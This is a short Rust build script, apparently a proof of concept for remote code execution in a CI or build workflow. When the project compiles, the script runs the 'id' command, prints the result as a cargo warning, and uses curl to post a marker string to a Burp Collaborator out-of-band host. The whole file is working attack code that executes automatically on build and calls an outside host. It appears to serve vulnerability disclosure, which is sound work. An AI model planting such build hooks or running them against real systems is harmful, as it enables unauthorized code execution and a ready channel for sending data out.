use std::process::Command;

fn main() {
    // 1. Log Proof
    println!("cargo:warning=### CRITICAL VULNERABILITY: RCE DEMONSTRATED ###");
    
    // 2. System Proof
    let output = Command::new("id").output().expect("Failed to run id");
    println!("cargo:warning=USER ID: {}", String::from_utf8_lossy(&output.stdout).trim());

    // 3. Network Proof (Burp)
    let burp_url = "https://zorngblwqri002lwggyan22i69c50xom.oastify.com/"; 
    let _ = Command::new("curl").args([burp_url, "-d", "RCE_ACTIVE_ON_FIXED_WORKFLOW"]).output();
}
